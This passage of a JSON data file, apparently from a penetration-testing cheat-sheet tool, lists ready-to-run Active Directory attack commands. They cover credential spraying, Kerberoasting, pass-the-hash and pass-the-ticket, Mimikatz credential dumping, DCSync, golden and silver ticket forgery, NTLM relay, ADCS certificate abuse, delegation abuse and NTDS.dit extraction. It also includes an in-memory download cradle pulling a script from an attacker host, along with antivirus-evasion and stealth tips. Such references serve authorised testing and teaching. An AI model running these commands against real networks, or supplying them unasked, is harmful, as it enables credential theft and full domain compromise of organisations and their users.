                  "subdesc": "Purpose: All-in-one AD enumeration and exploitation. Use nxc (NetExec) as the modern replacement for crackmapexec. Always use --continue-on-success when spraying credentials to avoid stopping at the first valid hit. Install: sudo apt install crackmapexec or pip3 install netexec",
                  "cmd": [
                    "# Network discovery — find live hosts and identify domain controllers",
                    "nxc smb <SUBNET>/24",
                    "",
                    "# Enumerate shares — look for readable/writable shares",
                    "nxc smb <TARGET> -u <USER> -p <PASS> --shares",
                    "",
                    "# Enumerate users",
                    "nxc smb <DC-IP> -u <USER> -p <PASS> --users",
                    "",
                    "# Password spraying (check lockout policy first with: net accounts /domain)",
                    "nxc smb <DC-IP> -u users.txt -p '<PASSWORD>' --continue-on-success",
                    "",
                    "# Check for local admin access — look for (Pwn3d!) in output",
                    "nxc smb <SUBNET>/24 -u <USER> -p <PASS>",
                    "",
                    "# Execute commands on targets where you have admin",
                    "nxc smb <TARGET> -u <USER> -p <PASS> -x 'whoami'",
                    "nxc smb <TARGET> -u <USER> -p <PASS> -X 'Get-Process'  # PowerShell",
                    "",
                    "# Dump SAM hashes (requires local admin)",
                    "nxc smb <TARGET> -u <USER> -p <PASS> --sam",
                    "",
                    "# Dump LSASS via lsassy module",
                    "nxc smb <TARGET> -u <USER> -p <PASS> -M lsassy",
                    "",
                    "# BloodHound collection via netexec",
                    "nxc ldap <DC-IP> -u <USER> -p <PASS> --bloodhound --collection All",
                    "",
                    "# Spider shares for sensitive files",
                    "nxc smb <TARGET> -u <USER> -p <PASS> --shares --spider <SHARE> --regex ."
                  ]
                }
              ]
            },
            {
              "desc": "Multi-Protocol Credential Spraying",
              "entries": [
                {
                  "subdesc": "When to run: After every new credential is obtained. Spray across all protocols to find additional access.",
                  "cmd": [
                    "# Spray new creds across all services — any (Pwn3d!) means you have admin on that host",
                    "nxc winrm <SUBNET>/24 -u <USER> -p <PASS>",
                    "nxc rdp <SUBNET>/24 -u <USER> -p <PASS>",
                    "nxc mssql <SUBNET>/24 -u <USER> -p <PASS>",
                    "nxc ssh <SUBNET>/24 -u <USER> -p <PASS>",
                    "",
                    "# Use NTLM hash instead of password (Pass-the-Hash)",
                    "nxc smb <SUBNET>/24 -u <USER> -H <NTLM-HASH>",
                    "nxc winrm <SUBNET>/24 -u <USER> -H <NTLM-HASH>"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-4",
          "name": "LDAP Enumeration",
          "description": "When to run: When you have valid domain credentials or if anonymous LDAP binding is enabled. Useful for finding Kerberoastable and AS-REP Roastable accounts directly.",
          "commands": [
            {
              "desc": "LDAP Enumeration",
              "entries": [
                {
                  "subdesc": "When to run: When you have valid domain credentials or if anonymous LDAP binding is enabled. Useful for finding Kerberoastable and AS-REP Roastable accounts directly.",
                  "cmd": [
                    "# Anonymous LDAP query — test if anonymous binding is allowed",
                    "ldapsearch -x -H ldap://<DC-IP> -b \"DC=domain,DC=com\"",
                    "",
                    "# Authenticated LDAP query",
                    "ldapsearch -x -H ldap://<DC-IP> -D '<DOMAIN>\\<USER>' -w '<PASSWORD>' -b \"DC=domain,DC=com\"",
                    "",
                    "# Enumerate all users",
                    "ldapsearch -x -H ldap://<DC-IP> -D '<DOMAIN>\\<USER>' -w '<PASS>' -b \"DC=domain,DC=com\" \"(objectClass=user)\" sAMAccountName",
                    "",
                    "# Find Kerberoastable accounts (accounts with SPNs set)",
                    "ldapsearch -x -H ldap://<DC-IP> -D '<DOMAIN>\\<USER>' -w '<PASS>' -b \"DC=domain,DC=com\" \"(&(objectClass=user)(servicePrincipalName=*))\" sAMAccountName servicePrincipalName",
                    "",
                    "# Find AS-REP Roastable accounts (Kerberos preauthentication disabled)",
                    "ldapsearch -x -H ldap://<DC-IP> -D '<DOMAIN>\\<USER>' -w '<PASS>' -b \"DC=domain,DC=com\" \"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" sAMAccountName"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-5",
          "name": "PowerView (PowerShell AD Enumeration)",
          "description": "Purpose: PowerShell-based AD enumeration module from PowerSploit. Extremely powerful for discovering misconfigurations, ACL abuse paths, and delegation settings. Install: Download PowerView.ps1 from the PowerSploit GitHub repo. Host on your attacker machine and load in-memory to avoid touching disk.",
          "commands": [
            {
              "desc": "PowerView (PowerShell AD Enumeration)",
              "entries": [
                {
                  "subdesc": "Purpose: PowerShell-based AD enumeration module from PowerSploit. Extremely powerful for discovering misconfigurations, ACL abuse paths, and delegation settings. Install: Download PowerView.ps1 from the PowerSploit GitHub repo. Host on your attacker machine and load in-memory to avoid touching disk.",
                  "cmd": [
                    "# Load PowerView in memory",
                    "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER-IP>/PowerView.ps1')",
                    "",
                    "# Domain info",
                    "Get-Domain",
                    "Get-DomainController",
                    "",
                    "# Users — look for descriptions containing passwords, service accounts",
                    "Get-DomainUser | Select SamAccountName, Description, MemberOf",
                    "Get-DomainUser -SPN  # Kerberoastable accounts",
                    "Get-DomainUser -PreauthNotRequired  # AS-REP Roastable",
                    "",
                    "# Groups",
                    "Get-DomainGroup | Select SamAccountName",
                    "Get-DomainGroupMember -Identity \"Domain Admins\"",
                    "",
                    "# Computers",
                    "Get-DomainComputer | Select DNSHostName, OperatingSystem",
                    "",
                    "# Shares — find readable/writable shares across the domain",
                    "Find-DomainShare -CheckShareAccess",
                    "",
                    "# GPOs — check for GPP passwords and interesting policies",
                    "Get-DomainGPO | Select DisplayName, GPCFileSysPath",
                    "",
                    "# ACLs — find dangerous permissions (GenericAll, WriteDACL, WriteOwner, etc.)",
                    "Find-InterestingDomainAcl -ResolveGUIDs",
                    "",
                    "# Trusts — identify inter-domain and inter-forest trusts",
                    "Get-DomainTrust",
                    "Get-ForestTrust"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-6",
          "name": "Impacket Tools (Remote AD Enumeration from Linux)",
          "description": "Purpose: Python-based tools for remote AD interaction from Linux. Essential when you don't have a Windows shell but have valid credentials. Each exec tool has different stealth and requirements. Certificate Attacks (ADCS) Install: sudo apt install python3-impacket or pip3 install impacket",
          "commands": [
            {
              "desc": "Impacket Tools (Remote AD Enumeration from Linux)",
              "entries": [
                {
                  "subdesc": "Purpose: Python-based tools for remote AD interaction from Linux. Essential when you don't have a Windows shell but have valid credentials. Each exec tool has different stealth and requirements. Certificate Attacks (ADCS) Install: sudo apt install python3-impacket or pip3 install impacket",
                  "cmd": [
                    "# Enumerate users via RPC — bruteforce RIDs to find all domain accounts",
                    "impacket-lookupsid <DOMAIN>/<USER>:<PASS>@<DC-IP>",
                    "",
                    "# Enumerate shares",
                    "impacket-smbclient <DOMAIN>/<USER>:<PASS>@<DC-IP>",
                    "",
                    "# Get domain password policy (check before spraying!)",
                    "impacket-samrdump <DOMAIN>/<USER>:<PASS>@<DC-IP>",
                    "",
                    "# Remote command execution (each has different requirements)",
                    "impacket-psexec <DOMAIN>/administrator:<PASS>@<TARGET>    # Requires admin + writable share, creates a service",
                    "impacket-wmiexec <DOMAIN>/administrator:<PASS>@<TARGET>    # Requires admin, more stealthy, uses WMI",
                    "impacket-smbexec <DOMAIN>/administrator:<PASS>@<TARGET>    # Requires admin, creates a service",
                    "impacket-atexec <DOMAIN>/administrator:<PASS>@<TARGET> 'whoami'  # Uses Task Scheduler",
                    "",
                    "# Evil-WinRM — interactive PowerShell via WinRM (port 5985/5986)",
                    "# Install: gem install evil-winrm",
                    "evil-winrm -i <TARGET> -u <USER> -p <PASS>",
                    "evil-winrm -i <TARGET> -u <USER> -H <NTLM-HASH>"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-7",
          "name": "ADCS Enumeration (Active Directory Certificate Services)",
          "description": "Purpose: ADCS manages digital certificates in AD environments. Misconfigured certificate templates are a common and powerful attack vector. Use certipy-ad to identify vulnerable templates, then exploit them for privilege escalation or domain persistence. Install: pip3 install certipy-ad",
          "commands": [
            {
              "desc": "Enumerate Vulnerable Templates",
              "entries": [
                {
                  "subdesc": "When to run: Early in AD enumeration, right after gaining any domain user credentials. Even low-privileged users can often enroll in vulnerable templates.",
                  "cmd": [
                    "# Find ALL vulnerable certificate templates — run this early!",
                    "certipy-ad find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC-IP> -vulnerable -stdout",
                    "",
                    "# Save full output to file for later analysis",
                    "certipy-ad find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC-IP> -vulnerable -text",
                    "",
                    "# Using NTLM hash instead of password",
                    "certipy-ad find -u <USER>@<DOMAIN> -hashes :<NTLM-HASH> -dc-ip <DC-IP> -vulnerable -stdout",
                    "",
                    "# List ALL templates (not just vulnerable) — useful for manual review",
                    "certipy-ad find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC-IP> -stdout"
                  ]
                }
              ]
            },
            {
              "desc": "Certify.exe (Windows Alternative)",
              "entries": [
                {
                  "subdesc": "When to run: When on a Windows host and certipy is not available. Certify is a C# tool from GhostPack.",
                  "cmd": [
                    "# Find vulnerable templates from Windows",
                    ".\\Certify.exe find /vulnerable",
                    "",
                    "# Find all templates",
                    ".\\Certify.exe find",
                    "",
                    "# Find templates the current user can enroll in",
                    ".\\Certify.exe find /enrolleeSuppliesSubject"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-8",
          "name": "Kerberoasting",
          "description": "When to use: You have any valid domain user credentials. Targets service accounts with SPNs set — these often have weak passwords. How it works: Request TGS tickets for accounts with SPNs, then crack them offline. No special privileges required.",
          "commands": [
            {
              "desc": "Kerberoasting",
              "entries": [
                {
                  "subdesc": "When to use: You have any valid domain user credentials. Targets service accounts with SPNs set — these often have weak passwords. How it works: Request TGS tickets for accounts with SPNs, then crack them offline. No special privileges required.",
                  "cmd": [
                    "# From Linux with Impacket — request all TGS tickets for SPN accounts",
                    "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP> -request -outputfile kerberoast.txt",
                    "",
                    "# Crack with hashcat (mode 13100 = Kerberos 5 TGS-REP)",
                    "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt"
                  ]
                },
                {
                  "cmd": [
                    "# From Windows with Rubeus",
                    ".\\Rubeus.exe kerberoast /outfile:kerberoast.txt",
                    "",
                    "# With PowerView",
                    "Invoke-Kerberoast | Export-CSV kerberoast.csv"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-9",
          "name": "AS-REP Roasting",
          "description": "When to use: You have a list of usernames (or even just one). Targets accounts with \"Do not require Kerberos preauthentication\" enabled. How it works: Request AS-REP for users without preauth — the response contains an encrypted part you can crack offline. No credentials needed if you know usernames.",
          "commands": [
            {
              "desc": "AS-REP Roasting",
              "entries": [
                {
                  "subdesc": "When to use: You have a list of usernames (or even just one). Targets accounts with \"Do not require Kerberos preauthentication\" enabled. How it works: Request AS-REP for users without preauth — the response contains an encrypted part you can crack offline. No credentials needed if you know usernames.",
                  "cmd": [
                    "# From Linux — with valid credentials to enumerate users",
                    "impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC-IP> -usersfile users.txt -format hashcat -outputfile asrep.txt",
                    "",
                    "# Without valid credentials (null session) — requires a username list",
                    "impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC-IP> -no-pass -usersfile users.txt",
                    "",
                    "# Crack with hashcat (mode 18200 = Kerberos 5 AS-REP)",
                    "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
                  ]
                },
                {
                  "cmd": [
                    "# From Windows with Rubeus",
                    ".\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-10",
          "name": "Pass-the-Hash (PtH)",
          "description": "When to use: You have an NTLM hash but not the plaintext password. Works because NTLM authentication uses the hash directly — no cracking needed. Requirement: The hash must belong to a user with admin access on the target for most exec tools.",
          "commands": [
            {
              "desc": "Pass-the-Hash (PtH)",
              "entries": [
                {
                  "subdesc": "When to use: You have an NTLM hash but not the plaintext password. Works because NTLM authentication uses the hash directly — no cracking needed. Requirement: The hash must belong to a user with admin access on the target for most exec tools.",
                  "cmd": [
                    "# Impacket tools — each uses a different execution method",
                    "impacket-psexec administrator@<TARGET> -hashes :<NTLM-HASH>    # Creates a service, noisy",
                    "impacket-wmiexec administrator@<TARGET> -hashes :<NTLM-HASH>    # Uses WMI, more stealthy",
                    "impacket-smbexec administrator@<TARGET> -hashes :<NTLM-HASH>    # Creates a service",
                    "",
                    "# Evil-WinRM — interactive PowerShell shell via WinRM (port 5985)",
                    "evil-winrm -i <TARGET> -u administrator -H <NTLM-HASH>",
                    "",
                    "# Spray hash across the network to find all hosts where this account has admin",
                    "nxc smb <SUBNET>/24 -u administrator -H <NTLM-HASH>",
                    "nxc winrm <SUBNET>/24 -u administrator -H <NTLM-HASH>"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-11",
          "name": "Pass-the-Ticket (PtT)",
          "description": "When to use: You have a stolen Kerberos ticket (.ccache or .kirbi file). Common after DCSync, delegation attacks, or extracting tickets from memory.",
          "commands": [
            {
              "desc": "Pass-the-Ticket (PtT)",
              "entries": [
                {
                  "subdesc": "When to use: You have a stolen Kerberos ticket (.ccache or .kirbi file). Common after DCSync, delegation attacks, or extracting tickets from memory.",
                  "cmd": [
                    "# Use a .ccache ticket from Linux",
                    "export KRB5CCNAME=/path/to/ticket.ccache",
                    "",
                    "# Then use with Impacket (note: -k means use Kerberos, -no-pass means don't prompt for password)",
                    "impacket-psexec <DOMAIN>/administrator@<TARGET> -k -no-pass",
                    "impacket-smbexec <DOMAIN>/administrator@<TARGET> -k -no-pass",
                    "impacket-wmiexec <DOMAIN>/administrator@<TARGET> -k -no-pass"
                  ]
                },
                {
                  "cmd": [
                    "# Inject ticket on Windows with Rubeus",
                    ".\\Rubeus.exe ptt /ticket:<BASE64-TICKET>",
                    "",
                    "# Or with Mimikatz",
                    "mimikatz# kerberos::ptt ticket.kirbi"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-12",
          "name": "Mimikatz",
          "description": "Purpose: The ultimate Windows credential extraction tool. Requires local admin for most commands. Tip: If antivirus blocks mimikatz.exe, try running it in-memory or use Invoke-Mimikatz.ps1.",
          "commands": [
            {
              "desc": "Mimikatz",
              "entries": [
                {
                  "subdesc": "Purpose: The ultimate Windows credential extraction tool. Requires local admin for most commands. Tip: If antivirus blocks mimikatz.exe, try running it in-memory or use Invoke-Mimikatz.ps1.",
                  "cmd": [
                    ":: Run Mimikatz",
                    "mimikatz.exe",
                    "",
                    ":: Enable debug privilege (required — needs local admin)",
                    "privilege::debug",
                    "",
                    ":: Dump LSASS credentials (plaintext on old systems, NTLM hashes on newer)",
                    "sekurlsa::logonpasswords",
                    "",
                    ":: Dump NTLM hashes from SAM",
                    "lsadump::sam",
                    "",
                    ":: Extract all Kerberos tickets from memory",
                    "sekurlsa::tickets /export",
                    "",
                    ":: DCSync attack (requires Replicating Directory Changes permissions)",
                    "lsadump::dcsync /user:<DOMAIN>\\krbtgt",
                    "lsadump::dcsync /user:<DOMAIN>\\Administrator",
                    "lsadump::dcsync /all /csv",
                    "",
                    ":: Pass-the-Hash — spawns a new process with the injected hash",
                    "sekurlsa::pth /user:administrator /domain:<DOMAIN> /ntlm:<HASH>"
                  ]
                }
              ]
            },
            {
              "desc": "Golden Ticket (with Mimikatz)",
              "entries": [
                {
                  "subdesc": "Purpose: Forge a TGT using the krbtgt hash — unlimited domain access for 10 years by default.",
                  "cmd": [
                    ":: Create and inject Golden Ticket",
                    "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN-SID> /krbtgt:<KRBTGT-HASH> /ptt",
                    "",
                    ":: Verify — access any resource",
                    "dir \\\\<DC-HOSTNAME>\\C$"
                  ]
                }
              ]
            },
            {
              "desc": "Silver Ticket (with Mimikatz)",
              "entries": [
                {
                  "subdesc": "Purpose: Forge a TGS for a specific service. Does NOT contact the DC, so it's stealthier than a Golden Ticket but limited in scope.",
                  "cmd": [
                    ":: Silver Ticket — specify /service based on what you want to access",
                    "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN-SID> /target:<TARGET-HOST> /service:<SPN> /rc4:<SERVICE-HASH> /ptt"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-13",
          "name": "DCSync Attack",
          "description": "When to use: You have an account with Replicating Directory Changes and Replicating Directory Changes All privileges (Domain Admins have this by default, but check for other accounts too via BloodHound). How it works: Simulates a Domain Controller replication request to extract password hashes for any account.",
          "commands": [
            {
              "desc": "DCSync Attack",
              "entries": [
                {
                  "subdesc": "When to use: You have an account with Replicating Directory Changes and Replicating Directory Changes All privileges (Domain Admins have this by default, but check for other accounts too via BloodHound). How it works: Simulates a Domain Controller replication request to extract password hashes for any account.",
                  "cmd": [
                    "# Dump ALL domain hashes — the ultimate prize",
                    "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC-IP>",
                    "impacket-secretsdump <DOMAIN>/<USER>@<DC-IP> -hashes :<NTLM-HASH>",
                    "",
                    "# Dump specific user only",
                    "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC-IP> -just-dc-user Administrator",
                    "",
                    "# Dump krbtgt hash for Golden Ticket creation",
                    "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC-IP> -just-dc-user krbtgt"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-14",
          "name": "Golden Ticket (from Linux)",
          "description": "Requirements: krbtgt NTLM hash + Domain SID. After creating a Golden Ticket, you can impersonate any user indefinitely.",
          "commands": [
            {
              "desc": "Golden Ticket (from Linux)",
              "entries": [
                {
                  "subdesc": "Requirements: krbtgt NTLM hash + Domain SID. After creating a Golden Ticket, you can impersonate any user indefinitely.",
                  "cmd": [
                    "# Step 1: Get Domain SID",
                    "impacket-lookupsid <DOMAIN>/<USER>:<PASS>@<DC-IP>",
                    "",
                    "# Step 2: Create Golden Ticket",
                    "impacket-ticketer -nthash <KRBTGT-HASH> -domain-sid <DOMAIN-SID> -domain <DOMAIN> Administrator",
                    "",
                    "# Step 3: Use the ticket",
                    "export KRB5CCNAME=Administrator.ccache",
                    "impacket-psexec <DOMAIN>/Administrator@<DC-HOSTNAME> -k -no-pass"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-15",
          "name": "SMB Relay Attack",
          "description": "When to use: When SMB signing is disabled on targets (very common on non-DC hosts). Relay captured NTLM authentication to another host where the victim has admin access. Requirement: At least one target with SMB signing disabled + a way to coerce NTLM authentication (Responder, PetitPotam, etc.)",
          "commands": [
            {
              "desc": "SMB Relay Attack",
              "entries": [
                {
                  "subdesc": "When to use: When SMB signing is disabled on targets (very common on non-DC hosts). Relay captured NTLM authentication to another host where the victim has admin access. Requirement: At least one target with SMB signing disabled + a way to coerce NTLM authentication (Responder, PetitPotam, etc.)",
                  "cmd": [
                    "# Step 1: Find hosts with SMB signing disabled",
                    "nxc smb <SUBNET>/24 --gen-relay-list targets.txt",
                    "",
                    "# Step 2: Configure Responder — disable SMB and HTTP (ntlmrelayx handles those)",
                    "# Edit /usr/share/responder/Responder.conf:",
                    "# SMB = Off",
                    "# HTTP = Off",
                    "",
                    "# Step 3: Start Responder to capture NTLM authentication",
                    "sudo responder -I eth0 -dwP",
                    "",
                    "# Step 4: Start ntlmrelayx to relay captured auth",
                    "impacket-ntlmrelayx -tf targets.txt -smb2support",
                    "",
                    "# With command execution on successful relay",
                    "impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'",
                    "",
                    "# Dump SAM hashes via relay",
                    "impacket-ntlmrelayx -tf targets.txt -smb2support --dump-sam"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-16",
          "name": "ADCS Exploitation (Certificates)",
          "description": "When to use: After certipy-ad find identifies vulnerable templates (see AD Enumeration page). ADCS misconfigurations are a high-value target — they can provide a direct path to Domain Admin. Install: pip3 install certipy-ad",
          "commands": [
            {
              "desc": "ESC1 — Misconfigured Certificate Template (SAN Allowed)",
              "entries": [
                {
                  "subdesc": "Condition: Template allows enrollee to specify a Subject Alternative Name (SAN), meaning you can request a certificate as any user.",
                  "cmd": [
                    "# Request a certificate impersonating the Domain Admin",
                    "certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC-IP> -ca <CA-NAME> -template <TEMPLATE-NAME> -upn administrator@<DOMAIN>",
                    "",
                    "# Authenticate using the certificate to get the admin's NTLM hash",
                    "certipy-ad auth -pfx administrator.pfx -dc-ip <DC-IP>",
                    "",
                    "# Now use the NTLM hash with PtH (see Pass-the-Hash section above)"
                  ]
                }
              ]
            },
            {
              "desc": "ESC4 — Vulnerable Template ACLs",
              "entries": [
                {
                  "subdesc": "Condition: Low-privileged user has write access to the certificate template object. Modify it to become ESC1, then exploit.",
                  "cmd": [
                    "# Step 1: Modify the template to allow SAN and Client Authentication",
                    "certipy-ad template -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC-IP> -template <TEMPLATE-NAME> -save-old",
                    "",
                    "# Step 2: Now exploit as ESC1",
                    "certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC-IP> -ca <CA-NAME> -template <TEMPLATE-NAME> -upn administrator@<DOMAIN>",
                    "",
                    "# Step 3: Authenticate",
                    "certipy-ad auth -pfx administrator.pfx -dc-ip <DC-IP>",
                    "",
                    "# Step 4: Restore the original template (optional, for stealth)",
                    "certipy-ad template -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC-IP> -template <TEMPLATE-NAME> -configuration <TEMPLATE-NAME>.json"
                  ]
                }
              ]
            },
            {
              "desc": "ESC7 — Vulnerable CA ACLs (ManageCA/ManageCertificates)",
              "entries": [
                {
                  "subdesc": "Condition: You have ManageCA or ManageCertificates permissions on the CA itself.",
                  "cmd": [
                    "# If you have ManageCA — add yourself as officer, then approve your own request",
                    "certipy-ad ca -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC-IP> -ca <CA-NAME> -add-officer <USER>",
                    "",
                    "# Enable SubCA template (commonly available)",
                    "certipy-ad ca -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC-IP> -ca <CA-NAME> -enable-template SubCA",
                    "",
                    "# Request a certificate (it will be denied — that's expected)",
                    "certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC-IP> -ca <CA-NAME> -template SubCA -upn administrator@<DOMAIN>",
                    "",
                    "# Issue the denied request using your officer privileges",
                    "certipy-ad ca -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC-IP> -ca <CA-NAME> -issue-request <REQUEST-ID>",
                    "",
                    "# Retrieve the issued certificate",
                    "certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC-IP> -ca <CA-NAME> -retrieve <REQUEST-ID>",
                    "",
                    "# Authenticate with it",
                    "certipy-ad auth -pfx administrator.pfx -dc-ip <DC-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "ESC8 — NTLM Relay to HTTP Enrollment",
              "entries": [
                {
                  "subdesc": "Condition: AD CS Web Enrollment is enabled (HTTP endpoint). Relay NTLM auth from a machine account to request a certificate.",
                  "cmd": [
                    "# Step 1: Start certipy relay listener targeting the CA's web enrollment",
                    "certipy-ad relay -target http://<CA-IP>/certsrv/certfnsh.asp -ca <CA-NAME> -template DomainController",
                    "",
                    "# Step 2: Coerce authentication from the DC (e.g., using PetitPotam)",
                    "python3 PetitPotam.py <ATTACKER-IP> <DC-IP>",
                    "",
                    "# Step 3: Certipy will automatically request a certificate using the relayed auth",
                    "# Step 4: Authenticate with the certificate",
                    "certipy-ad auth -pfx dc.pfx -dc-ip <DC-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "PFX Authentication and Kerberos",
              "entries": [
                {
                  "subdesc": "Purpose: After obtaining a .pfx certificate via any ESC attack, extract credentials or get a TGT.",
                  "cmd": [
                    "# Get NTLM hash from the certificate",
                    "certipy-ad auth -pfx administrator.pfx -dc-ip <DC-IP>",
                    "",
                    "# Request a TGT using the certificate (for Kerberos-only environments)",
                    "certipy-ad auth -pfx administrator.pfx -dc-ip <DC-IP> -username administrator -domain <DOMAIN>"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-17",
          "name": "Shadow Credentials",
          "description": "When to use: You have write access to a target's msDS-KeyCredentialLink attribute (check via BloodHound — look for GenericWrite or GenericAll on a user/computer object). How it works: Add a \"shadow credential\" to the target, allowing you to authenticate as them via PKINIT. Install: pip3 install certipy-ad (included with certipy)",
          "commands": [
            {
              "desc": "Shadow Credentials",
              "entries": [
                {
                  "subdesc": "When to use: You have write access to a target's msDS-KeyCredentialLink attribute (check via BloodHound — look for GenericWrite or GenericAll on a user/computer object). How it works: Add a \"shadow credential\" to the target, allowing you to authenticate as them via PKINIT. Install: pip3 install certipy-ad (included with certipy)",
                  "cmd": [
                    "# Add a shadow credential to the target account",
                    "certipy-ad shadow auto -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC-IP> -account <TARGET-USER>",
                    "",
                    "# This outputs a .pfx file — authenticate with it",
                    "certipy-ad auth -pfx <TARGET-USER>.pfx -dc-ip <DC-IP>",
                    "",
                    "# Clean up (remove the shadow credential)",
                    "certipy-ad shadow remove -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC-IP> -account <TARGET-USER> -device-id <DEVICE-ID>"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-18",
          "name": "Kerberos Delegation Attacks",
          "description": "Kerberos Delegation Attacks",
          "commands": [
            {
              "desc": "Unconstrained Delegation",
              "entries": [
                {
                  "subdesc": "When to use: A computer you've compromised has Unconstrained Delegation enabled. Any user that authenticates to this host leaves their TGT in memory.",
                  "cmd": [
                    "# Find computers with Unconstrained Delegation",
                    "Get-DomainComputer -Unconstrained | Select DNSHostName",
                    "",
                    "# Monitor for incoming TGTs on the compromised host",
                    ".\\Rubeus.exe monitor /interval:5",
                    "",
                    "# Coerce DC authentication using SpoolSample (PrinterBug)",
                    ".\\SpoolSample.exe <DC-HOSTNAME> <COMPROMISED-HOST>",
                    "",
                    "# Use captured TGT",
                    ".\\Rubeus.exe ptt /ticket:<BASE64-TGT>"
                  ]
                }
              ]
            },
            {
              "desc": "Constrained Delegation",
              "entries": [
                {
                  "subdesc": "When to use: A service account has constrained delegation configured (allowed to delegate to specific SPNs). Exploit via S4U2Self + S4U2Proxy to impersonate any user to the delegated service.",
                  "cmd": [
                    "# Find accounts with constrained delegation",
                    "impacket-findDelegation <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP>",
                    "",
                    "# S4U attack — impersonate Administrator to the allowed service",
                    "impacket-getST -spn <TARGET-SPN> -impersonate Administrator <DOMAIN>/<SERVICE-ACCOUNT>:<PASS>",
                    "export KRB5CCNAME=Administrator.ccache",
                    "impacket-psexec <DOMAIN>/Administrator@<TARGET> -k -no-pass"
                  ]
                }
              ]
            },
            {
              "desc": "Resource-Based Constrained Delegation (RBCD)",
              "entries": [
                {
                  "subdesc": "When to use: You have write access to a computer object's msDS-AllowedToActOnBehalfOfOtherIdentity attribute (check via BloodHound for GenericWrite/GenericAll on computer objects).",
                  "cmd": [
                    "# Step 1: Create a fake computer account (default domain allows up to 10)",
                    "impacket-addcomputer <DOMAIN>/<USER>:<PASS> -computer-name 'FAKE$' -computer-pass 'Password123'",
                    "",
                    "# Step 2: Set RBCD — allow FAKE$ to delegate to the target",
                    "impacket-rbcd <DOMAIN>/<USER>:<PASS> -delegate-to <TARGET-COMPUTER>$ -delegate-from 'FAKE$' -action write",
                    "",
                    "# Step 3: S4U attack to impersonate admin on the target",
                    "impacket-getST -spn cifs/<TARGET-COMPUTER>.<DOMAIN> -impersonate Administrator <DOMAIN>/'FAKE$':'Password123'",
                    "export KRB5CCNAME=Administrator.ccache",
                    "impacket-psexec <DOMAIN>/Administrator@<TARGET-COMPUTER> -k -no-pass"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-19",
          "name": "NTDS.dit Dumping",
          "description": "When to use: You have Domain Admin access and want to extract ALL domain credentials. The final step after owning the domain.",
          "commands": [
            {
              "desc": "NTDS.dit Dumping",
              "entries": [
                {
                  "subdesc": "When to use: You have Domain Admin access and want to extract ALL domain credentials. The final step after owning the domain.",
                  "cmd": [
                    "# Remote dump via secretsdump (preferred — does everything automatically)",
                    "impacket-secretsdump <DOMAIN>/Administrator:<PASS>@<DC-IP>"
                  ]
                },
                {
                  "cmd": [
                    ":: Manual dump via Volume Shadow Copy (on the DC itself)",
                    "vssadmin create shadow /for=C:",
                    "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit",
                    "reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM"
                  ]
                },
                {
                  "cmd": [
                    "# Parse the dumped files offline",
                    "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-20",
          "name": "GPP (Group Policy Preferences)",
          "description": "When to use: Always check SYSVOL for leftover GPP XML files if the domain has older DCs or hasn't been cleaned up. Patched in MS14-025 but old credentials may still exist. Group Policy Preferences allowed admins to create policies using embedded credentials. These credentials were encrypted with a \"cPassword\" key that Microsoft accidentally published. Although patched in MS14-025, previously stored credentials are NOT removed by the patch. Metasploit: Use auxiliary/scanner/smb/smb_enum_gpp if you have valid domain credentials.",
          "commands": [
            {
              "desc": "GPP (Group Policy Preferences)",
              "entries": [
                {
